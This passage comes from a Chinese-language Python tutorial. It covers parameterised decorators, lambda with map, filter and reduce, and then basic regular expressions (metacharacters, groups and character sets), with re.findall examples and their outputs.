<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">f1</span>():
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"&#25105;&#26159;f1"</span>)
</pre>
</div>

<p>
运行结果<br>
</p>
<div class="org-src-container">
<pre class="src src-python">&#24320;&#22987;ing
&#25105;&#26159;f1
&#21040;&#36798;&#35013;&#39280;&#22120;&#37324;&#38754;
</pre>
</div>

<p>
<b>三层装饰器，有参数的装饰器</b><br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> time
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">outer</span>(a):
    <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">dec1</span>(func):
        <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"&#24320;&#22987;ing"</span>)
        time.sleep(3)
        <span style="color: #a020f0;">def</span> <span style="color: #0000ff;">wrapper</span>(*args,**kwargs):
            func(*args,**kwargs)
            <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"&#21040;&#36798;&#35013;&#39280;&#22120;&#37324;&#38754;"</span>,a)
        <span style="color: #a020f0;">return</span> wrapper
    <span style="color: #a020f0;">return</span> dec1

<span style="color: #228b22;">@outer</span>(10)
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">f1</span>():
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"&#25105;&#26159;f1"</span>)
</pre>
</div>

<p>
运行结果<br>
</p>
<div class="org-src-container">
<pre class="src src-python">&#24320;&#22987;ing
&#25105;&#26159;f1
&#21040;&#36798;&#35013;&#39280;&#22120;&#37324;&#38754; 10
</pre>
</div>
</div>
</div>
<div id="outline-container-h:0cd2ed59-1360-478d-afc0-4748dee8aca1" class="outline-5">
<h5 id="h:0cd2ed59-1360-478d-afc0-4748dee8aca1">匿名函数</h5>
<div class="outline-text-5" id="text-h:0cd2ed59-1360-478d-afc0-4748dee8aca1">
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a0522d;">s</span> = <span style="color: #a020f0;">lambda</span> a,b:a+b
<span style="color: #483d8b;">print</span>(s)
<span style="color: #483d8b;">print</span>(s(1,2))

<span style="color: #b22222;">#</span><span style="color: #b22222;">map+&#21311;&#21517;&#20989;&#25968;</span>
<span style="color: #a0522d;">lists</span> = [1,3,5,7,9]
<span style="color: #a0522d;">result</span> = <span style="color: #483d8b;">map</span>(<span style="color: #a020f0;">lambda</span> x:x*x,lists)
<span style="color: #483d8b;">print</span>(result)
<span style="color: #483d8b;">print</span>(<span style="color: #483d8b;">list</span>(result))

<span style="color: #b22222;">#</span><span style="color: #b22222;">if+&#21311;&#21517;&#20989;&#25968;</span>
<span style="color: #a0522d;">func</span> = <span style="color: #a020f0;">lambda</span> x:x <span style="color: #a020f0;">if</span> x==10 <span style="color: #a020f0;">else</span> x+1
<span style="color: #483d8b;">print</span>(func(10))
<span style="color: #483d8b;">print</span>(func(11))

<span style="color: #a0522d;">func</span> = <span style="color: #a020f0;">lambda</span> x:<span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"&#22823;&#20110;10"</span>) <span style="color: #a020f0;">if</span> x&gt;10 <span style="color: #a020f0;">else</span> <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">"&#23569;&#20110;10"</span>)
<span style="color: #483d8b;">print</span>(func(11))
<span style="color: #483d8b;">print</span>(func(2))

<span style="color: #b22222;">#</span><span style="color: #b22222;">filter+&#21311;&#21517;&#20989;&#25968;</span>
<span style="color: #a0522d;">result</span> = <span style="color: #483d8b;">list</span>(<span style="color: #483d8b;">filter</span>(<span style="color: #a020f0;">lambda</span> x:x&gt;5, lists))
<span style="color: #483d8b;">print</span>(result)

<span style="color: #b22222;">#</span><span style="color: #b22222;">reduce +&#21311;&#21517;&#20989;&#25968;</span>
<span style="color: #a020f0;">from</span> functools <span style="color: #a020f0;">import</span> <span style="color: #483d8b;">reduce</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">reduce &#20989;&#25968;&#21487;&#20197;&#25353;&#29031;&#32473;&#23450;&#30340;&#26041;&#27861;&#25226;&#36755;&#20837;&#21442;&#25968;&#20013;&#19978;&#24207;&#21015;&#32553;&#20943;&#20026;&#21333;&#20010;&#30340;&#20540;&#65292;&#20855;&#20307;&#30340;&#20570;&#27861;&#22914;&#19979;&#65306;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#39318;&#20808;&#20174;&#24207;&#21015;&#20013;&#21435;&#38500;&#22836;&#20004;&#20010;&#20803;&#32032;&#24182;&#25226;&#23427;&#20256;&#36882;&#21040;&#37027;&#20010;&#20108;&#20803;&#20989;&#25968;&#20013;&#21435;&#65292;&#27714;&#20986;&#19968;&#20010;&#20540;&#65292;&#20877;&#25226;&#36825;&#20010;&#21152;&#21040;&#24207;&#21015;&#20013;&#24490;&#29615;&#27714;&#19979;&#19968;&#20010;&#20540;&#65292;&#30452;&#21040;&#26368;&#21518;&#19968;&#20010;&#20540; &#12290;</span>
<span style="color: #a0522d;">result</span> = <span style="color: #483d8b;">reduce</span>(<span style="color: #a020f0;">lambda</span> x,y:x*y, [1,2,3,4,5] )<span style="color: #b22222;">#</span><span style="color: #b22222;">((((1*2)*3)*4)*5</span>
<span style="color: #483d8b;">print</span>(result)
</pre>
</div>

<p>
运行结果<br>
</p>
<div class="org-src-container">
<pre class="src src-python">&lt;function &lt;<span style="color: #a020f0;">lambda</span>&gt; at 0x00000285FDBC3E18&gt;
3
&lt;<span style="color: #483d8b;">map</span> <span style="color: #483d8b;">object</span> at 0x00000285FDF312B0&gt;
[1, 9, 25, 49, 81]
10
12
&#22823;&#20110;10
<span style="color: #008b8b;">None</span>
&#23569;&#20110;10
<span style="color: #008b8b;">None</span>
[7, 9]
120
</pre>
</div>
</div>
</div>
</div>
</div>
<div id="outline-container-h:e8ecd8d8-886c-4412-8e84-c48afb72bfbe" class="outline-3">
<h3 id="h:e8ecd8d8-886c-4412-8e84-c48afb72bfbe">异常和错误</h3>
<div class="outline-text-3" id="text-h:e8ecd8d8-886c-4412-8e84-c48afb72bfbe">
<p>
<a href="https://docs.python.org/zh-cn/3/tutorial/errors.html">https://docs.python.org/zh-cn/3/tutorial/errors.html</a><br>
</p>
</div>
</div>
<div id="outline-container-h:7aa617e0-e7cb-40c9-9547-7e2c0e6d0765" class="outline-3">
<h3 id="h:7aa617e0-e7cb-40c9-9547-7e2c0e6d0765">虚拟环境和包</h3>
<div class="outline-text-3" id="text-h:7aa617e0-e7cb-40c9-9547-7e2c0e6d0765">
<p>
<a href="https://docs.python.org/zh-cn/3/tutorial/venv.html">https://docs.python.org/zh-cn/3/tutorial/venv.html</a><br>
</p>
</div>
</div>
</section>
<section id="outline-container-h:bec5d77d-7b72-4984-9a88-1c703cdbc24e" class="outline-2">
<h2 id="h:bec5d77d-7b72-4984-9a88-1c703cdbc24e">python 安全应用编程入门</h2>
<div class="outline-text-2" id="text-h:bec5d77d-7b72-4984-9a88-1c703cdbc24e">
<p>
主要内容：<br>
</p>
<ul class="org-ul">
<li>python 正则表达式<br></li>
<li>python 网络编程<br></li>
<li>python web 编程<br></li>
<li>python 数据库编程<br></li>
<li>python 多线程<br></li>
</ul>
</div>
<div id="outline-container-h:1c64491e-e20e-42d1-bff9-015af7f7e906" class="outline-3">
<h3 id="h:1c64491e-e20e-42d1-bff9-015af7f7e906">Python 正则表达式</h3>
<div class="outline-text-3" id="text-h:1c64491e-e20e-42d1-bff9-015af7f7e906">
<p>
正则表达式，Regular Expression，缩写为regex、regexp、RE等。<br>
</p>

<p>
正则表达式是文本处理极为重要的技术，用它可以对字符串按照某种规则进行检索、替换。<br>
</p>

<p>
1970年代，Unix之父Ken Thompson将正则表达式引入到Unix中文本编辑器ed和grep命令中，由此正则表达式普及开来。<br>
</p>

<p>
1980年后，perl语言对Henry Spencer编写的库，扩展了很多新的特性。1997年开始，Philip Hazel开发出了PCRE(Perl Compatible Regular Expressions)，它被PHP和HTTPD等工具采用。<br>
</p>

<p>
正则表达式应用极其广泛，shell中处理文本的命令、各种高级编程语言都支持正则表达式。<br>
</p>

<p>
参考<br>
</p>
<ul class="org-ul">
<li>正则表达式30分钟入门教程 <a href="https://www.w3cschool.cn/regex_rmjc/">https://www.w3cschool.cn/regex_rmjc/</a><br></li>
<li>perl文官正则: <a href="https://perldoc.perl.org/perlre">https://perldoc.perl.org/perlre</a><br></li>
<li>grep 中正则: <a href="https://www.gnu.org/software/grep/manual/grep.html#Regular-Expressions">https://www.gnu.org/software/grep/manual/grep.html#Regular-Expressions</a><br></li>
<li>python re正则表达式: <a href="https://docs.python.org/zh-cn/3/library/re.html">https://docs.python.org/zh-cn/3/library/re.html</a><br></li>
<li>Microsoft<br>
<ul class="org-ul">
<li>.NET正则: <a href="https://learn.microsoft.com/en-us/dotnet/standard/base-types/regular-expressions">https://learn.microsoft.com/en-us/dotnet/standard/base-types/regular-expressions</a><br></li>
<li>visual studio ide 正则: <a href="https://learn.microsoft.com/en-us/visualstudio/ide/using-regular-expressions-in-visual-studio?view=vs-2022">https://learn.microsoft.com/en-us/visualstudio/ide/using-regular-expressions-in-visual-studio?view=vs-2022</a><br></li>
</ul></li>
<li>基础正则表达式: <a href="https://www.cnblogs.com/f-ck-need-u/p/9621130.html">https://www.cnblogs.com/f-ck-need-u/p/9621130.html</a><br></li>
<li>Perl正则表达式超详细教程: <a href="https://www.cnblogs.com/f-ck-need-u/p/9648439.html">https://www.cnblogs.com/f-ck-need-u/p/9648439.html</a><br></li>
</ul>

<p>
测试：<br>
</p>
<ul class="org-ul">
<li>正则测试工具RegEx Tester: <a href="https://sourceforge.net/projects/regextester/">https://sourceforge.net/projects/regextester/</a><br></li>
<li>在线测试：<a href="https://regextester.github.io/">https://regextester.github.io/</a><br></li>
</ul>


<p>
正则表达式是一个特殊的字符序列，用于判断一个字符串是否与我们所设定的字符序列是否匹配，也就是说检查一个字符串是否与某种模式匹配。<br>
</p>

<p>
正则表达式可以包含普通或者特殊字符。绝大部分普通字符，比如 'A' , 'a' , 或者 '0' ，都是最简单的正则表达式。它们就匹配自身。你可以拼接普通字符，所以 cici 匹配字符串 'cici' .<br>
</p>

<p>
一些字符，如 <code>'|'</code> or <code>'('</code> ，是特殊的。特殊字符要么代表普通字符的类别，要么影响它们周围的正则表达式的解释方式。正则表达式模式字符串可能不包含空字节，但可以使用 \number 符号指定空字节，例如 '\x00' .<br>
</p>

<p>
重复修饰符 ( * , + , ? , {m,n} , 等) 不能直接嵌套。这样避免了非贪婪后缀 ? 修饰符，和其他实现中的修饰符产生的多义性。要应用一个内层重复嵌套，可以使用括号。 比如，表达式 <code>(?:a{6})*</code> 匹配6个 'a' 字符重复任意次数。<br>
</p>
</div>
<div id="outline-container-h:2189deb7-3081-46ce-adfd-b83318a73392" class="outline-4">
<h4 id="h:2189deb7-3081-46ce-adfd-b83318a73392">基本语法</h4>
<div class="outline-text-4" id="text-h:2189deb7-3081-46ce-adfd-b83318a73392">
</div>
<div id="outline-container-h:d4f94820-c7b0-4311-9601-08b16653cfc6" class="outline-5">
<h5 id="h:d4f94820-c7b0-4311-9601-08b16653cfc6">元字符</h5>
<div class="outline-text-5" id="text-h:d4f94820-c7b0-4311-9601-08b16653cfc6">
<p>
metacharacter<br>
<a href="https://www.cnblogs.com/f-ck-need-u/p/9621130.html#%E5%85%83%E5%AD%97%E7%AC%A6">https://www.cnblogs.com/f-ck-need-u/p/9621130.html#%E5%85%83%E5%AD%97%E7%AC%A6</a><br>
</p>

<p>
范例：使用正则工具或者在线正则网站测试<br>
</p>
<pre class="example" id="orgb02d83b">
abc xyz
123
中文
</pre>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #483d8b;">.</span> <span style="color: #b22222;">#</span><span style="color: #b22222;">&#38750;&#22810;&#34892;&#21644;&#21333;&#34892;&#19979;&#65292;&#40664;&#35748;&#21305;&#37197;&#38500;&#25442;&#34892;&#31526;&#20043;&#22806;&#20219;&#24847;&#19968;&#20010;&#23383;&#31526;</span>
\w\w <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21305;&#37197;2&#20010;&#23383;&#31526;</span>
\d <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21305;&#37197;1&#20010;&#25968;&#23383;</span>
[abc ] <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21305;&#37197;abc&#21644;&#31354;&#26684;&#20013;&#20219;&#24847;&#19968;&#20010;&#23383;&#31526;</span>
[abc\s] <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21305;&#37197;abc&#21644;&#31354;&#26684;&#23383;&#31526;&#20013;&#20219;&#24847;&#19968;&#20010;&#23383;&#31526;</span>
\w\s\w <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21305;&#37197;c x&#21644;z&#25442;&#34892;1&#21644;3&#25442;&#34892;&#20013;</span>
[\d\s\d] <span style="color: #b22222;">#</span><span style="color: #b22222;">&#30456;&#24403;&#20110;[\d\s] &#21305;&#37197;&#25968;&#23383;&#21644;&#31354;&#30333;&#23383;&#31526;&#20013;&#20219;&#24847;&#23383;&#31526;</span>
\b\w\w\b <span style="color: #b22222;">#</span><span style="color: #b22222;">&#21363;&#20316;&#35789;&#39318;&#21448;&#20316;&#35789;&#23614;&#65292;&#21305;&#37197;&#20013;&#25991;</span>
</pre>
</div>
</div>
</div>
<div id="outline-container-h:b6aeeb71-9ec8-496f-bd67-8e83bb0c3d82" class="outline-5">
<h5 id="h:b6aeeb71-9ec8-496f-bd67-8e83bb0c3d82">转义</h5>
<div class="outline-text-5" id="text-h:b6aeeb71-9ec8-496f-bd67-8e83bb0c3d82">
<p>
凡是在正则表达式中有特殊意义的符号，如果想使用它的本意，请使用\转义。<br>
反斜杠自身，得使用<br>
\r、\n还是转义后代表回车、换行<br>
</p>
</div>
</div>
<div id="outline-container-h:477f125c-6bbd-43dc-8f81-35058b1213a7" class="outline-5">
<h5 id="h:477f125c-6bbd-43dc-8f81-35058b1213a7">重复</h5>
<div class="outline-text-5" id="text-h:477f125c-6bbd-43dc-8f81-35058b1213a7">
<p>
<a href="https://www.cnblogs.com/f-ck-need-u/p/9621130.html#%E5%85%83%E5%AD%97%E7%AC%A6">https://www.cnblogs.com/f-ck-need-u/p/9621130.html#%E5%85%83%E5%AD%97%E7%AC%A6</a><br>
</p>

<p>
比如在一段字符串中寻找是否含有某个字符或某些字符，通常我们使用内置函数来实现，如下：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#35774;&#23450;&#19968;&#20010;&#24120;&#37327;</span>
<span style="color: #a0522d;">a</span> = <span style="color: #8b2252;">'CiCi|twowater|liangdianshui|&#32593;&#32476;&#23433;&#20840;|ReadingWithU'</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#21028;&#26029;&#26159;&#21542;&#26377; &#8220;CiCi&#8221; &#36825;&#20010;&#23383;&#31526;&#20018;&#65292;&#20351;&#29992; PY &#33258;&#24102;&#20989;&#25968;</span>
<span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'&#26159;&#21542;&#21547;&#26377;&#8220;CiCi&#8221;&#36825;&#20010;&#23383;&#31526;&#20018;&#65306;{0}'</span>.<span style="color: #483d8b;">format</span>(a.index(<span style="color: #8b2252;">'CiCi'</span>) &gt; -1))
<span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'&#26159;&#21542;&#21547;&#26377;&#8220;CiCi&#8221;&#36825;&#20010;&#23383;&#31526;&#20018;&#65306;{0}'</span>.<span style="color: #483d8b;">format</span>(<span style="color: #8b2252;">'CiCi'</span> <span style="color: #a020f0;">in</span> a))
</pre>
</div>

<p>
输出的结果如下：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">&#26159;&#21542;&#21547;&#26377;&#8220;CiCi&#8221;&#36825;&#20010;&#23383;&#31526;&#20018;&#65306;True
&#26159;&#21542;&#21547;&#26377;&#8220;CiCi&#8221;&#36825;&#20010;&#23383;&#31526;&#20018;&#65306;True
</pre>
</div>

<p>
那么，如果使用正则表达式呢？<br>
</p>

<p>
刚刚提到过，Python 给我们提供了 re 模块来实现正则表达式的所有功能，那么我们先使用其中的一个函数：<br>
</p>
<div class="org-src-container">
<pre class="src src-python">re.findall(pattern, string[, flags])
</pre>
</div>

<p>
该函数实现了在字符串中找到正则表达式所匹配的所有子串，并组成一个列表返回,具体操作如下：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> re

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35774;&#23450;&#19968;&#20010;&#24120;&#37327;</span>
<span style="color: #a0522d;">a</span> = <span style="color: #8b2252;">'CiCi|twowater|liangdianshui|&#32593;&#32476;&#23433;&#20840;|ReadingWithU'</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#27491;&#21017;&#34920;&#36798;&#24335;</span>
<span style="color: #a0522d;">findall</span> = re.findall(<span style="color: #8b2252;">'CiCi'</span>, a)
<span style="color: #483d8b;">print</span>(findall)

<span style="color: #a020f0;">if</span> <span style="color: #483d8b;">len</span>(findall) &gt; 0:
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'a &#21547;&#26377;&#8220;CiCi&#8221;&#36825;&#20010;&#23383;&#31526;&#20018;'</span>)
<span style="color: #a020f0;">else</span>:
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'a &#19981;&#21547;&#26377;&#8220;CiCi&#8221;&#36825;&#20010;&#23383;&#31526;&#20018;'</span>)
</pre>
</div>

<p>
输出的结果：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">[<span style="color: #8b2252;">'CiCi'</span>]
a &#21547;&#26377;&#8220;CiCi&#8221;&#36825;&#20010;&#23383;&#31526;&#20018;
</pre>
</div>


<p>
从输出结果可以看到，可以实现和内置函数一样的功能，可是在这里也要强调一点，上面这个例子只是方便我们理解正则表达式，这个正则表达式的写法是毫无意义的。为什么这样说呢？<br>
</p>

<p>
因为用 Python 自带函数就能解决的问题，我们就没必要使用正则表达式了，这样做多此一举。而且上面例子中的正则表达式设置成为了一个常量，并不是一个正则表达式的规则，正则表达式的灵魂在于规则，所以这样做意义不大。<br>
</p>

<p>
那么正则表达式的规则怎么写呢？先不急，我们一步一步来，先来一个简单的，找出字符串中的所有小写字母。首先我们在 findall 函数中第一个参数写正则表达式的规则，其中 [a-z] 就是匹配任何小写字母，第二个参数只要填写要匹配的字符串就行了。具体如下：<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> re
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#35774;&#23450;&#19968;&#20010;&#24120;&#37327;</span>
<span style="color: #a0522d;">a</span> = <span style="color: #8b2252;">'CiCi|twowater|liangdianshui|&#32593;&#32476;&#23433;&#20840;|ReadingWithU'</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#36873;&#25321; a &#37324;&#38754;&#30340;&#25152;&#26377;&#23567;&#20889;&#33521;&#25991;&#23383;&#27597;</span>
<span style="color: #a0522d;">re_findall</span> = re.findall(<span style="color: #8b2252;">'[a-z]'</span>, a)
<span style="color: #483d8b;">print</span>(re_findall)
</pre>
</div>

<p>
输出的结果：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">[<span style="color: #8b2252;">'i'</span>, <span style="color: #8b2252;">'i'</span>, <span style="color: #8b2252;">'t'</span>, <span style="color: #8b2252;">'w'</span>, <span style="color: #8b2252;">'o'</span>, <span style="color: #8b2252;">'w'</span>, <span style="color: #8b2252;">'a'</span>, <span style="color: #8b2252;">'t'</span>, <span style="color: #8b2252;">'e'</span>, <span style="color: #8b2252;">'r'</span>, <span style="color: #8b2252;">'l'</span>, <span style="color: #8b2252;">'i'</span>, <span style="color: #8b2252;">'a'</span>, <span style="color: #8b2252;">'n'</span>, <span style="color: #8b2252;">'g'</span>, <span style="color: #8b2252;">'d'</span>, <span style="color: #8b2252;">'i'</span>, <span style="color: #8b2252;">'a'</span>, <span style="color: #8b2252;">'n'</span>, <span style="color: #8b2252;">'s'</span>, <span style="color: #8b2252;">'h'</span>, <span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'i'</span>, <span style="color: #8b2252;">'e'</span>, <span style="color: #8b2252;">'a'</span>, <span style="color: #8b2252;">'d'</span>, <span style="color: #8b2252;">'i'</span>, <span style="color: #8b2252;">'n'</span>, <span style="color: #8b2252;">'g'</span>, <span style="color: #8b2252;">'i'</span>, <span style="color: #8b2252;">'t'</span>, <span style="color: #8b2252;">'h'</span>]
</pre>
</div>

<p>
这样我们就拿到了字符串中的所有小写字母了。<br>
</p>
</div>
</div>
<div id="outline-container-h:fcab0834-d33e-496b-8f77-eab839924097" class="outline-5">
<h5 id="h:fcab0834-d33e-496b-8f77-eab839924097">或</h5>
<div class="outline-text-5" id="text-h:fcab0834-d33e-496b-8f77-eab839924097">
<p>
x|y 匹配x或者y<br>
</p>

<p>
wood took foot food  使用 w|food 或者 (w|f)ood<br>
</p>
</div>
</div>
<div id="outline-container-h:ac2aaa83-ddc8-4e0e-a63f-aa6d029c00bd" class="outline-5">
<h5 id="h:ac2aaa83-ddc8-4e0e-a63f-aa6d029c00bd">捕获</h5>
<div class="outline-text-5" id="text-h:ac2aaa83-ddc8-4e0e-a63f-aa6d029c00bd">
<ul class="org-ul">
<li>(pattern)<br>
使用小括号指定一个子表达式，也叫分组<br>
捕获后会自动分配组号从1开始可以改变优先级<br></li>
<li>\数字<br>
匹配对应的分组<br>
例： (very) \1 匹配very very，但捕获的组group是very<br></li>
<li>(?:pattern)<br>
如果仅仅为了改变优先级，就不需要捕获分组<br>
例：<br>
(?:w|f)ood<br>
'industr(?:y|ies)等价 'industry|industries'<br></li>
<li>(?&lt;name&gt;exp) (?'name'exp)<br>
命名分组捕获，但是可以通过name访问分组<br>
Python语法必须是(?P&lt;name&gt;exp)<br></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-h:44cebff8-40de-485c-ba04-bad6bd647a88" class="outline-4">
<h4 id="h:44cebff8-40de-485c-ba04-bad6bd647a88">字符集</h4>
<div class="outline-text-4" id="text-h:44cebff8-40de-485c-ba04-bad6bd647a88">
<p>
字符集是由一对方括号 “[]” 括起来的字符集合。使用字符集，可以匹配多个字符中的一个。<br>
</p>

<p>
举个例子，比如你使用 C[ET]O 匹配到的是 CEO 或 CTO ，也就是说 [ET] 代表的是一个 E 或者一个 T 。像上面提到的 [a-z] ,就是所有小写字母中的其中一个，这里使用了连字符 “-” 定义一个连续字符的字符范围。当然，像这种写法，里面可以包含多个字符范围的，比如： [0-9a-fA-F] ,匹配单个的十六进制数字，且不分大小写。注意了，字符和范围定义的先后顺序对匹配的结果是没有任何影响的。<br>
</p>

<p>
其实说了那么多，只是想证明，字符集一对方括号 “[]” 里面的字符关系是"或（OR）"关系，下面看一个例子：<br>
</p>

<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> re
<span style="color: #a0522d;">a</span> = <span style="color: #8b2252;">'uav,ubv,ucv,uwv,uzv,ucv,uov'</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#23383;&#31526;&#38598;</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#21462; u &#21644; v &#20013;&#38388;&#26159; a &#25110; b &#25110; c &#30340;&#23383;&#31526;</span>
<span style="color: #a0522d;">findall</span> = re.findall(<span style="color: #8b2252;">'u[abc]v'</span>, a)
<span style="color: #483d8b;">print</span>(findall)
<span style="color: #b22222;"># </span><span style="color: #b22222;">&#22914;&#26524;&#26159;&#36830;&#32493;&#30340;&#23383;&#27597;&#65292;&#25968;&#23383;&#21487;&#20197;&#20351;&#29992; - &#26469;&#20195;&#26367;</span>
<span style="color: #a0522d;">l</span> = re.findall(<span style="color: #8b2252;">'u[a-c]v'</span>, a)
<span style="color: #483d8b;">print</span>(l)

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#21462; u &#21644; v &#20013;&#38388;&#19981;&#26159; a &#25110; b &#25110; c &#30340;&#23383;&#31526;</span>
<span style="color: #a0522d;">re_findall</span> = re.findall(<span style="color: #8b2252;">'u[^abc]v'</span>, a)
<span style="color: #483d8b;">print</span>(re_findall)
</pre>
</div>

<p>
输出的结果：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">[<span style="color: #8b2252;">'uav'</span>, <span style="color: #8b2252;">'ubv'</span>, <span style="color: #8b2252;">'ucv'</span>, <span style="color: #8b2252;">'ucv'</span>]
[<span style="color: #8b2252;">'uav'</span>, <span style="color: #8b2252;">'ubv'</span>, <span style="color: #8b2252;">'ucv'</span>, <span style="color: #8b2252;">'ucv'</span>]
[<span style="color: #8b2252;">'uwv'</span>, <span style="color: #8b2252;">'uzv'</span>, <span style="color: #8b2252;">'uov'</span>]
</pre>
</div>

<p>
在例子中，使用了取反字符集，也就是在左方括号 “[” 后面紧跟一个尖括号 “^”，就会对字符集取反。需要记住的一点是，取反字符集必须要匹配一个字符。比如： q[^u] 并不意味着：匹配一个 q，后面没有 u 跟着。它意味着：匹配一个 q，后面跟着一个不是 u 的字符。具体可以对比上面例子中输出的结果来理解。<br>
</p>

<p>
我们都知道，正则表达式本身就定义了一些规则，比如 \d ,匹配所有数字字符,其实它是等价于 [0-9]，下面也写了个例子，通过字符集的形式解释了这些特殊字符。<br>
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">import</span> re

<span style="color: #a0522d;">a</span> = <span style="color: #8b2252;">'uav_ubv_ucv_uwv_uzv_ucv_uov&amp;123-456-789'</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#27010;&#25324;&#23383;&#31526;&#38598;</span>

<span style="color: #b22222;"># </span><span style="color: #b22222;">\d &#30456;&#24403;&#20110; [0-9] ,&#21305;&#37197;&#25152;&#26377;&#25968;&#23383;&#23383;&#31526;</span>
<span style="color: #b22222;"># </span><span style="color: #b22222;">\D &#30456;&#24403;&#20110; [^0-9] &#65292; &#21305;&#37197;&#25152;&#26377;&#38750;&#25968;&#23383;&#23383;&#31526;</span>
<span style="color: #a0522d;">findall1</span> = re.findall(<span style="color: #8b2252;">'\d'</span>, a)
<span style="color: #a0522d;">findall2</span> = re.findall(<span style="color: #8b2252;">'[0-9]'</span>, a)
<span style="color: #a0522d;">findall3</span> = re.findall(<span style="color: #8b2252;">'\D'</span>, a)
<span style="color: #a0522d;">findall4</span> = re.findall(<span style="color: #8b2252;">'[^0-9]'</span>, a)
<span style="color: #483d8b;">print</span>(findall1)
<span style="color: #483d8b;">print</span>(findall2)
<span style="color: #483d8b;">print</span>(findall3)
<span style="color: #483d8b;">print</span>(findall4)

<span style="color: #b22222;"># </span><span style="color: #b22222;">\w &#21305;&#37197;&#21253;&#25324;&#19979;&#21010;&#32447;&#30340;&#20219;&#20309;&#21333;&#35789;&#23383;&#31526;&#65292;&#31561;&#20215;&#20110; [A-Za-z0-9_]</span>
<span style="color: #a0522d;">findall5</span> = re.findall(<span style="color: #8b2252;">'\w'</span>, a)
<span style="color: #a0522d;">findall6</span> = re.findall(<span style="color: #8b2252;">'[A-Za-z0-9_]'</span>, a)
<span style="color: #483d8b;">print</span>(findall5)
<span style="color: #483d8b;">print</span>(findall6)
</pre>
</div>

<p>
输出结果：<br>
</p>
<div class="org-src-container">
<pre class="src src-sh">[<span style="color: #8b2252;">'1'</span>, <span style="color: #8b2252;">'2'</span>, <span style="color: #8b2252;">'3'</span>, <span style="color: #8b2252;">'4'</span>, <span style="color: #8b2252;">'5'</span>, <span style="color: #8b2252;">'6'</span>, <span style="color: #8b2252;">'7'</span>, <span style="color: #8b2252;">'8'</span>, <span style="color: #8b2252;">'9'</span>]
[<span style="color: #8b2252;">'1'</span>, <span style="color: #8b2252;">'2'</span>, <span style="color: #8b2252;">'3'</span>, <span style="color: #8b2252;">'4'</span>, <span style="color: #8b2252;">'5'</span>, <span style="color: #8b2252;">'6'</span>, <span style="color: #8b2252;">'7'</span>, <span style="color: #8b2252;">'8'</span>, <span style="color: #8b2252;">'9'</span>]
[<span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'a'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'_'</span>, <span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'b'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'_'</span>, <span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'c'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'_'</span>, <span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'w'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'_'</span>, <span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'z'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'_'</span>, <span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'c'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'_'</span>, <span style="color: #8b2252;">'u'</span>, <span style="color: #8b2252;">'o'</span>, <span style="color: #8b2252;">'v'</span>, <span style="color: #8b2252;">'&amp;'</span>, <span style="color: #8b2252;">'-'</span>, <span style="color: #8b2252;">'-'</span>]
